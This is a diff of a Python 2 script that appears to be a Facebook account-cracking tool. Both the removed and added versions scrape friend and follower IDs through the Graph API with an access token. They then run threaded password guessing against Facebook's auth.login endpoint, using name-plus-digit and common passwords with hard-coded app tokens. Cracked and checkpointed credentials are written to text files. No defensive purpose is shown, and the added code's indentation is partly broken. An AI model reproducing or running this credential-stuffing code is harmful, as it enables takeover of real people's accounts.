-		z = json.loads(r.text)
-		for i in z["data"]:
-			uid = i["id"]
-			na = i["name"]
-			id.append(uid+"|"+na)
-	elif select =="2":
-		os.system("clear")
-		logo()
-		print("")
-		print("\t\033[93;1m  MANUAL PASS CRACKING")
-		print("")
-		print("\033[93;1m  EXAMPLE :\033[96;1m 123, 1122, 321, 1234, 786 ETC")
-		print("")
-		idt = raw_input("\n\033[92;1m  INPUT PUBLIC FOLLOWER ID : ")
-		print("")
-		p1 = raw_input("\033[92;1m  NAME + DIGIT PASSWORD 1: ")
-		p2 = raw_input("\033[93;1m  NAME + DIGIT PASSWORD 2: ")
-		p3 = raw_input("\033[94;1m  NAME + DIGIT PASSWORD 3: ")
-		p4 = raw_input("\033[95;1m  NAME + DIGIT PASSWORD 4: ")
-		print("")
-		print("\033[93;1m  EXAMPLE :\033[96;1m 102030, 223344, 556677, 786786 ETC ")
-		print("")
-		pass5 = raw_input("\033[92;1m  PASSWORD 5: ")
-		pass6 = raw_input("\033[93;1m  PASSWORD 6: ")
-		pass7 = raw_input("\033[94;1m  PASSWORD 7: ")
-		try:
-			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
-			q = json.loads(r.text)
-			os.system('clear')
-			logo()
-			print('')
-			print("\t\033[93;1m  MANUAL PASS CRACKING")
-			print('')
-			print("\033[92;1m  COINING FROM : "+q["name"])
-		except KeyError:
-			print("\t\033[91;1m     INVALID LINK OR TOKEN")
-			print("")
-			raw_input("\033[91;1m PRESS ENTER TO BACK")
-			crack()
-		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=999999")
-		z = json.loads(r.text)
-		for i in z["data"]:
-			uid = i["id"]
-			na = i["name"]
-			id.append(uid+"|"+na)
-	elif select =="3":
-		os.system("clear")
-		logo()
-		print("")
-		print("\t\033[93;1m  MANUAL PASS CRACKING")
-		print("")
-		print("")
-                filelist = raw_input('\033[92;1m  INPUT FILE: ')
-		try:
-			for line in open(filelist, 'r').readlines():
-				id.append(line.strip())
-		except IOError:
-			print("\t\033[91;1m  REQUESTED FILE NOT FOUND")
-			print("")
-			raw_input("\033[93;1m PRESS ENTER TO BACK")
-			crack()
-		print("\033[93;1m  EXAMPLE :\033[96;1m 12, 1122, 321, 1234, 786 ETC")
-		print("")
-		p1 = raw_input("\033[92;1m  NAME + DIGIT PASSWORD 1: ")
-		p2 = raw_input("\033[93;1m  NAME + DIGIT PASSWORD 2: ")
-		p3 = raw_input("\033[94;1m  NAME + DIGIT PASSWORD 3: ")
-		p4 = raw_input("\033[95;1m  NAME + DIGIT PASSWORD 4: ")
-		print("")
-		print("\033[93;1m  EXAMPLE :\033[96;1m 102030, 223344, 556677, 786786 ETC ")
-		print("")
-		pass5 = raw_input("\033[92;1m  PASSWORD 5: ")
-		pass6 = raw_input("\033[93;1m  PASSWORD 6: ")
-		pass7 = raw_input("\033[94;1m  PASSWORD 7: ")
-		
-	elif select =="0":
-	    menu()
-	else:
-		print("")
-		print("\t\033[91;1m  SELECT VALID OPTION")
-		print("")
-		crack_select()
-	print("")
-	print("\033[93;1m  TOTAL IDS : \033[92;1m"+str(len(id)))
-	print("\033[93;1m  THE PROCESS HAS STARTED")
-	print("\033[92;1m  BRUTE HAS BEEN STARTED\x1b[0m")
-	print("")
-	linex()
-	print("")
-	def main(arg):
-		user=arg
-		uid,name=user.split("|")
-		vaugent = random.choice(agents)
-		session = requests.Session()
-		session.headers.update({'User-Agent': vaugent})
-		try:
-			pass1 = name.lower().split(' ')[0]+p1
-			data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass1+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
-			q = json.loads(data)
-			if "access_token" in q and "EAAA" in q:
-				print(" \033[1;32m [JF-OK] "+uid+" | "+pass1+"\033[0;97m")
-				ok = open("ok.txt", "a")
-				ok.write(uid+"|"+pass1+"\n")
-				ok.close()
-				oks.append(uid+pass1)
-			else:
-				if "www.facebook.com" in q["error_msg"]:
-					print(" \033[1;33m [JF-CP] "+uid+" | "+pass1+"\033[0;97m")
-					cp = open("cp.txt", "a")
-					cp.write(uid+"|"+pass1+"\n")
-					cp.close()
-					cps.append(uid+pass1)
-				else:
-					pass2 = name.lower().split(' ')[0]+p2
-					data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass2+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
-					q = json.loads(data)
-					if "access_token" in q and "EAAA" in q:
-						print(" \033[1;32m [JF-OK] "+uid+" | "+pass2+"\033[0;97m")
-						ok = open("ok.txt", "a")
-						ok.write(uid+"|"+pass2+"\n")
-						ok.close()
-						oks.append(uid+pass2)
-					else:
-						if "www.facebook.com" in q["error_msg"]:
-							print(" \033[1;33m [JF-CP] "+uid+" | "+pass2+"\033[0;97m")
-							cp = open("cp.txt", "a")
-							cp.write(uid+"|"+pass2+"\n")
-							cp.close()
-							cps.append(uid+pass2)
-						else:
-							pass3 = name.lower().split(' ')[0]+p3
-							data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass3+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
-							q = json.loads(data)
-							if "access_token" in q and "EAAA" in q:
-								print(" \033[1;32m [JF-OK] "+uid+" | "+pass3+"\033[0;97m")
-								ok = open("ok.txt", "a")
-								ok.write(uid+"|"+pass3+"\n")
-								ok.close()
-								oks.append(uid+pass3)
-							else:
-								if "www.facebook.com" in q["error_msg"]:
-									print(" \033[1;33m [JF-CP] "+uid+" | "+pass3+"\033[0;97m")
-									cp = open("cp.txt", "a")
-									cp.write(uid+"|"+pass3+"\n")
-									cp.close()
-									cps.append(uid+pass3)
-								else:
-									pass4 = name.lower().split(' ')[0]+p4
-									data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass4+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
-									q = json.loads(data)
-									if "access_token" in q and "EAAA" in q:
-										print(" \033[1;32m [JF-OK] "+uid+" | "+pass4+"\033[0;97m")
-										ok = open("ok.txt", "a")
-										ok.write(uid+"|"+pass4+"\n")
-										ok.close()
-										oks.append(uid+pass4)
-									else:
-										if "www.facebook.com" in q["error_msg"]:
-											print(" \033[1;33m [JF-CP] "+uid+" | "+pass4+"\033[0;97m")
-											cp = open("cp.txt", "a")
-											cp.write(uid+"|"+pass4+"\n")
-											cp.close()
-											cps.append(uid+pass4)
-										else:
-											data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass5+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
-											q = json.loads(data)
-											if "access_token" in q and "EAAA" in q:
-												print(" \033[1;32m [JF-OK] "+uid+" | "+pass5+"\033[0;97m")
-												ok = open("ok.txt", "a")
-												ok.write(uid+"|"+pass5+"\n")
-												ok.close()
-												oks.append(uid+pass5)
-											else:
-												if "www.facebook.com" in q["error_msg"]:
-													print(" \033[1;33m [JF-CP] "+uid+" | "+pass5+"\033[0;97m")
-													cp = open("cp.txt", "a")
-													cp.write(uid+"|"+pass5+"\n")
-													cp.close()
-													cps.append(uid+pass5)
-												else:
-													data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass6+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
-													q = json.loads(data)
-													if "access_token" in q and "EAAA" in q:
-														print(" \033[1;32m [JF-OK] "+uid+" | "+pass6+"\033[0;97m")
-														ok = open("ok.txt", "a")
-														ok.write(uid+"|"+pass6+"\n")
-														ok.close()
-														oks.append(uid+pass6)
-													else:
-														if "www.facebook.com" in q["error_msg"]:
-															print(" \033[1;33m [JF-CP] "+uid+" | "+pass6+"\033[0;97m")
-															cp = open("cp.txt", "a")
-															cp.write(uid+"|"+pass6+"\n")
-															cp.close()
-															cps.append(uid+pass6)
-														else:
-															data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass7+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
-															q = json.loads(data)
-															if "access_token" in q and "EAAA" in q:
-																print(" \033[1;32m [JF-OK] "+uid+" | "+pass7+"\033[0;97m")
-																ok = open("ok.txt", "a")
-																ok.write(uid+"|"+pass7+"\n")
-																ok.close()
-																oks.append(uid+pass7)
-															else:
-																if "www.facebook.com" in q["error_msg"]:
-																	print(" \033[1;33m [JF-CP] "+uid+" | "+pass7+"\033[0;97m")
-																	cp = open("cp.txt", "a")
-																	cp.write(uid+"|"+pass7+"\n")
-																	cp.close()
-																	cps.append(uid+pass7)
-																else:
-																	pass8 = name.lower().split(' ')[1]+p1
-																	data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass8+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
-																	q = json.loads(data)
-																	if "access_token" in q and "EAAA" in q:
-																		print(" \033[1;32m [JF-OK] "+uid+" | "+pass8+"\033[0;97m")
-																		ok = open("ok.txt", "a")
-																		ok.write(uid+"|"+pass8+"\n")
-																		ok.close()
-																		oks.append(uid+pass8)
-																	else:
-																		if "www.facebook.com" in q["error_msg"]:
-																			print(" \033[1;33m [JF-CP] "+uid+" | "+pass8+"\033[0;97m")
-																			cp = open("cp.txt", "a")
-																			cp.write(uid+"|"+pass8+"\n")
-																			cp.close()
-																			cps.append(uid+pass8)
-												
-										
-										
-		except:
-			pass
-	p = ThreadPool(30)
-	p.map(main, id)
-	print("")
-	linex()
-	print("")
-	print("\033[93;1m THE PROCESS HAS BEEN COMPLETED")
-	print("\033[93;1m TOTAL \033[92;1mOK\033[93;1m/\033[91;1mCP: "+str(len(oks))+"/"+str(len(cps)))
-	print("")
-	linex()
-	print("")
-	raw_input("\033[93;1m PRESS ENTER TO BACK ")
-	menu()
-	
-
-def ex_id():
     global token
-    idg = []
+
+ 
+
     os.system("clear")
+
+ 
+
+    print logo
+
+ 
+
     try:
-        token = open("vau_token.txt", "r").read()
-    except(KeyError , IOError):
-        token()
+
+ 
+
+        token = open(".fb_token.txt","r").read()
+
+ 
+
+    except (KeyError , IOError):
+
+ 
+
+        login()
+
+ 
+
     try:
+
+ 
+
         r = requests.get("https://graph.facebook.com/me?access_token="+token)
+
+ 
+
         q = json.loads(r.text)
-        name = q["name"]
-    except(KeyError):
-        logo()
+
+ 
+
+        nm = q["name"]
+
+ 
+
+        nmf = nm.rsplit(" ")[0]
+
+ 
+
+        ok = nmf
+
+ 
+
+    except (KeyError , IOError):
+
+ 
+
         print("")
-        print("\t\033[91;1m  LOGGED IN TOKEN HAS EXPIRED")
-        os.system("rm -rf vau_token.txt")
+
+ 
+
+        print("login account has checkpoint").center(50)
+
+ 
+
         print("")
+
+ 
+
+        os.system("rm -rf .fb_token.txt")
+
+ 
+
         time.sleep(1)
-        token()
-    os.system('clear')
-    logo()
-    print ''
-    print '\033[92;1m      DUMP PUBLIC ID FRIEND LIST'
-    print ''
-    idh = raw_input('\033[93;1m   INPUT ID: ')
-    try:
-        r = requests.get('https://graph.facebook.com/' + idh + '?access_token=' + token, headers=header)
-        q = json.loads(r.text)
-        print ' COLLECTIN FROM: ' + q['name']
-    except KeyError:
-        print ''
-        print '\033[93;1m\tINVALID ID PROVIDED'
-        print ''
-        raw_input('\033[93;1m PRESS ENTER TO BACK')
-        ex_id()
 
-    r = requests.get('https://graph.facebook.com/' + idh + '/friends?access_token=' + token, headers=header)
-    q = json.loads(r.text)
-    ids = open('ids_friends.txt', 'w')
-    for i in q['data']:
-        uid = i['id'].encode('utf-8')
-        na = i['name'].encode('utf-8')
-        idg.append(uid + '|' + na)
-        ids.write(uid + '|' + na + '\n')
+ 
 
-    ids.close()
-    print ''
-    linex()
-    print ''
-    print '\033[92;1m THE PROCESS HAS COMPLETED'
-    print '\033[93;1m TOTAL IDS: \033[92;1m' + str(len(idg))
-    print ''
-    linex()
-    print ''
-    raw_input('\033[95;1m PRESS ENTER TO DOWNLOAD FILE')
-    print '\033[93;1m FILE DOWNLOADED SUCCESSFULLY'
-    print '\033[92;1m SAVED /sdcard/userids.txt'
-    print ''
-    time.sleep(1)
-    ex_id()
+        login()
+
+ 
+
+    except requests.exceptions.ConnectionError:
+
+ 
+
+        print logo
+
+ 
+
+        print("")
+
+ 
+
+        print("Your internet connection failed").center(50)
+
+ 
+
+        print("")
+
+ 
+
+        time.sleep(2)
+
+ 
+
+        menu()
+
+ 
+
+    os.system("clear")
+
+ 
+
+    print logo
+
+ 
+
+    print("")
+
+ 
+
+    print("\t\033[1;92mActive Token.... : " +nm)
+
+ 
+
+    print("")
+
+ 
+
+    print("\033[1;97m[1]\033[1;92mCrack From Friendlist")
+
+ 
+
+    print("")
+
+ 
+
+    print("\033[1;97m[2]\033[1;92mCrack From Public id")
+
+ 
+
+    print("")
+
+ 
+
+    print("\033[1;97m[3]\033[1;92mCrack From Followers id")
+
+ 
+
+    print("")
+
+ 
+
+    print("\033[1;97m[0]\033[1;97mEXIT Z4IN")
+
+ 
+
+    print("")
+
+ 
+
+    menu_select()
+
+ 
+
+def menu_select():
+
+ 
+
+	select = raw_input("\033[1;97m Choose Option : ")
+
+ 
+
+	id=[]
+
+ 
+
+	oks=[]
+
+ 
+
+	cps=[]
+
+ 
+
+	if select=="1":
+
+ 
+
+		os.system("clear")
+
+ 
+
+		print logo
+
+ 
+
+		print("")
+
+ 
+
+		r = requests.get("https://graph.facebook.com/me/friends?access_token="+token, headers=header)
+
+ 
+
+		z = json.loads(r.text)
+
+ 
+
+		for s in z["data"]:
+
+ 
+
+			uid=s['id']
+
+ 
+
+			na=s['name']
+
+ 
+
+			nm=na.rsplit(" ")[0]
+
+ 
+
+			id.append(uid+'='+nm)
+
+ 
+
+	if select =="2":
+
+ 
+
+		os.system("clear")
+
+ 
+
+		print(logo)
+
+ 
+
+		print("")
+
+ 
+
+		idt = raw_input("\033[1;97m[#] Put ID Numeric Id :\033[1;96m ")
+
+ 
+
+		os.system("clear")
+
+ 
+
+		print logo
+
+ 
+
+		try:
+
+ 
+
+			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
+
+ 
+
+			q = json.loads(r.text)
+
+ 
+
+			print("[!] Target from : "+q["name"])
+
+ 
+
+		except (KeyError , IOError):
+
+ 
+
+		    print("")
+
+ 
+
+		    print("\033[1;91your login account has checkpoint").center(50)
+
+ 
+
+		    print("")
+
+ 
+
+		    menu()
+
+ 
+
+		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
+
+ 
+
+		z = json.loads(r.text)
+
+ 
+
+		for i in z["data"]:
+
+ 
+
+			uid=i['id']
+
+ 
+
+			na=i['name']
+
+ 
+
+			nm=na.rsplit(" ")[0]
+
+ 
+
+			id.append(uid+'='+nm)
+
+ 
+
+	elif select =="3":
+
+ 
+
+		os.system("clear")
+
+ 
+
+		print logo
+
+ 
+
+		print("")
+
+ 
+
+		idt = raw_input("\033[1;97m[#] Put ID Link :\033[1;96m ")
+
+ 
+
+		os.system("clear")
+
+ 
+
+		print logo
+
+ 
+
+		try:
+
+ 
+
+			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
+
+ 
+
+			q = json.loads(r.text)
+
+ 
+
+			print(" Target from  : "+q["name"])
+
+ 
+
+		except (KeyError , IOError):
+
+ 
+
+		    print("")
+
+ 
+
+		    print("\033[1;91m login id has checkpoint").center(50)
+
+ 
+
+		    print("")
+
+ 
+
+		    time.sleep(3)
+
+ 
+
+		    menu()
+
+ 
+
+		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=5000", headers=header)
+
+ 
+
+		z = json.loads(r.text)
+
+ 
+
+		for i in z["data"]:
+
+ 
+
+			uid=i['id']
+
+ 
+
+			na=i['name']
+
+ 
+
+			nm=na.rsplit(" ")[0]
+
+ 
+
+			id.append(uid+'='+nm)
+
+ 
+
+	elif select =="0":
+
+ 
+
+	    os.system("exit")
+
+ 
+
+	else:
+
+ 
+
+	    print("")
+
+ 
+
+	    print("Please Select A Valid Option").center(50)
+
+ 
+
+	    time.sleep(2)
+
+ 
+
+	    menu_select()
+
+ 
+
+	print("[#] Total IDs..... : "+str(len(id)))
+
+ 
+
+	time.sleep(0.5)
+
+ 
+
+	print("[#] Please Wait A minute.....")
+
+ 
+
+	print 47*("-")
+
+ 
+
+	print('')
+
+ 
+
+	
+
+ 
+
+	def main(arg):
+
+ 
+
+		user=arg
+
+ 
+
+		uid,name=user.split("=")
+
+ 
+
+		try:
+
+ 
+
+		    pass1=name+"123"
+
+ 
+
+		    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
+
+ 
+
+		    d=json.loads(q)
+
+ 
+
+		    if 'www.facebook.com' in d['error_msg']:
+
+ 
+
+		        print("\033[1;93m[Z4IN-CP] "+uid+" = "+pass1)
+
+ 
+
+		        cp=open("mzcp.txt","a")
+
+ 
+
+		        cp.write(uid+" = "+pass1+"\n")
+
+ 
+
+		        cp.close()
+
+ 
+
+		        cps.append(uid)
+
+ 
+
+		    else:
+
+ 
+
+		    	if "access_token" in d:
+
+ 
+
+		            print("\x1b[1;97m[Z4IN-OK] "+uid+" = "+pass1+"\x1b[1;0m")
+
+ 
+
+		            ok=open("mzok.txt","a")
+
+ 
+
+		            ok.write(uid+" = "+pass1+"\n")
+
+ 
+
+		            ok.close()
+
+ 
+
+		            oks.append(uid)
+
+ 
+
+		        else:
+
+ 
+
+		            pass2=name+"1234"
+
+ 
+
+		            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
+
+ 
+
+		            d=json.loads(q)
+
+ 
+
+		            if 'www.facebook.com' in d['error_msg']:
+
+ 
+
+		                print("\033[1;93m[Z4IN-CP] "+uid+" = "+pass2)
+
+ 
+
+		                cp=open("mzcp.txt","a")
+
+ 
+
+		                cp.write(uid+" = "+pass2+"\n")
+
+ 
+
+		                cp.close()
+
+ 
+
+		                cps.append(uid)
+
+ 
+
+		            else:
+
+ 
+
+		                if 'access_token' in d:
+
+ 
+
+		                    print("\x1b[1;97m[Z4IN-OK] "+uid+" = "+pass2+"\x1b[1;0m")
+
+ 
+
+		                    ok=open("mzok.txt","a")
+
+ 
+
+		                    ok.write(uid+" = "+pass2+"\n")
+
+ 
+
+		                    ok.close()
+
+ 
+
+		                    oks.append(uid)
+
+ 
+
+		                else:
+
+ 
+
+		                    pass3=name+"12345"
+
+ 
+
+		                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
+
+ 
+
+		                    d=json.loads(q)
+
+ 
+
+		                    if 'www.facebook.com' in d['error_msg']:
+
+ 
+
+		                        print("\033[1;93m[Z4IN-CP] "+uid+" = "+pass3)
+
+ 
+
+		                        cp=open("mzcp.txt","a")
+
+ 
+
+		                        cp.write(uid+" = "+pass3+"\n")
+
+ 
+
+		                        cp.close()
+
+ 
+
+		                        cps.append(uid)
+
+ 
+
+		                    else:
+
+ 
+
+		                        if 'access_token' in d:
+
+ 
+
+		                            print("\x1b[1;97m[Z4IN-OK] "+uid+" = "+pass3+"\x1b[1;0m")
+
+ 
+
+		                            ok=open("mzok.txt","a")
+
+ 
+
+		                            ok.write(uid+" = "+pass3+"\n")
+
+ 
+
+		                            ok.close()
+
+ 
+
+		                            oks.append(uid)
+
+ 
+
+		                        else:
+
+ 
+
+		                            pass4=name+"786"
+
+ 
+
+		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
+
+ 
+
+		                            d=json.loads(q)
+
+ 
+
+		                            if 'www.facebook.com' in d['error_msg']:
+
+ 
+
+		                                print("\033[1;93m[Z4IN-CP] "+uid+" = "+pass4)
+
+ 
+
+		                                cp=open("mzcp.txt","a")
+
+ 
+
+		                                cp.write(uid+" = "+pass4+"\n")
+
+ 
+
+		                                cp.close()
+
+ 
+
+		                                cps.append(uid)
+
+ 
+
+		                            else:
+
+ 
+
+		                                if 'access_token' in d:
+
+ 
+
+		                                    print("\x1b[1;97m[Z4IN-OK] "+uid+" = "+pass4+"\x1b[1;0m")
+
+ 
+
+		                                    ok=open("mzok.txt","a")
+
+ 
+
+		                                    ok.write(uid+" = "+pass4+"\n")
+
+ 
+
+		                                    ok.close()
+
+ 
+
+		                                    oks.append(uid)
+
+ 
+
+		                                else:
+
+ 
+
+		                                    pass5="000786"
+
+ 
+
+		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
+
+ 
+
+		                                    d=json.loads(q)
+
+ 
+
+		                                    if 'www.facebook.com' in d['error_msg']:
+
+ 
+
+		                                        print("\033[1;93m[Z4IN-CP] "+uid+" = "+pass5)
+
+ 
+
+		                                        cp=open("mzcp.txt","a")
+
+ 
+
+		                                        cp.write(uid+" = "+pass5+"\n")
+
+ 
+
+		                                        cp.close()
+
+ 
+
+		                                        cps.append(uid)
+
+ 
+
+		                                    else:
+
+ 
+
+		                                        if 'access_token' in d:
+
+ 
+
+		                                            print("\x1b[1;97m[Z4IN-OK] "+uid+" = "+pass5+"\x1b[1;0m")
+
+ 
+
+		                                            ok=open("mzok.txt","a")
+
+ 
+
+		                                            ok.write(uid+" = "+pass5+"\n")
+
+ 
+
+		                                            ok.close()
+
+ 
+
+		                                            oks.append(uid)
+
+ 
+
+		                                        else:
+
+ 
+
+		                                            pass6="khan123"
+
+ 
+
+		                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
+
+ 
+
+		                                            d=json.loads(q)
+
+ 
+
+		                                            if 'www.facebook.com' in d['error_msg']:
+
+ 
+
+		                                                print("\033[1;93m[Z4IN-CP] "+uid+" = "+pass6)
+
+ 
+
+		                                                cp=open("mzcp.txt","a")
+
+ 
+
+		                                                cp.write(uid+" = "+pass6+"\n")
+
+ 
+
+		                                                cp.close()
+
+ 
+
+		                                                cps.append(uid)
+
+ 
+
+		                                            else:
+
+ 
+
+		                                                if 'access_token' in d:
+
+ 
+
+		                                                    print("\x1b[1;97m[Z4IN-OK] "+uid+" = "+pass6+"\x1b[1;0m")
+
+ 
+
+		                                                    ok=open("mzok.txt","a")
+
+ 
+
+		                                                    ok.write(uid+" = "+pass6+"\n")
+
+ 
+
+		                                                    ok.close()
+
+ 
+
+		                                                    oks.append(uid)
+
+ 
+
+		                                                else:
+
+ 
+
+		                                                    pass7="786123"
+
+ 
+
+		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
+
+ 
+
+		                                                    d=json.loads(q)
+
+ 
+
+		                                                    if 'www.facebook.com' in d['error_msg']:
+
+ 
+
+		                                                        print("\033[1;93m[Z4IN-CP] "+uid+" = "+pass7)
+
+ 
+
+		                                                        cp=open("mzcp.txt","a")
+
+ 
+
+		                                                        cp.write(uid+" = "+pass7+"\n")
+
+ 
+
+		                                                        cp.close()
+
+ 
+
+		                                                        cps.append(uid)
+
+ 
+
+		                                                    else:
+
+ 
+
+		                                                        if 'access_token' in d:
+
+ 
+
+		                                                            print("\x1b[1;97m[Z4IN-OK] "+uid+" = "+pass7+"\x1b[1;0m")
+
+ 
+
+		                                                            ok=open("mzok.txt","a")
+
+ 
+
+		                                                            ok.write(uid+" = "+pass7+"\n")
+
+ 
+
+		                                                            ok.close()
+
+ 
+
+		                                                            oks.append(uid)
+
+ 
+
+									
+
+ 
+
+															
+
+ 
+
+		except:
+
+ 
+
+			pass
+
+ 
+
+		
+
+ 
+
+	p = ThreadPool(30)
+
+ 
+
+	p.map(main, id)
+
+ 
+
+	print (" ")
+
+ 
+
+	print (47*"-")
+
+ 
+print ("[!] Process has completed")
+
+ 
+
+	print ("[!] itz Z4IN Brand Total Cp/Ok : "+str(len(cps)) + "/"+str(len(oks)))
+
+ 
+
+	print (47*"-")
+
+ 
+
+	raw_input("\t\x1b[0;97mPress enter to main menu back")
+
+ 
+
+	menu()
+
+ 
+
+	
+
+ 
 
 if __name__ == '__main__':
-	main()
+
+ 
+
+    main()
+
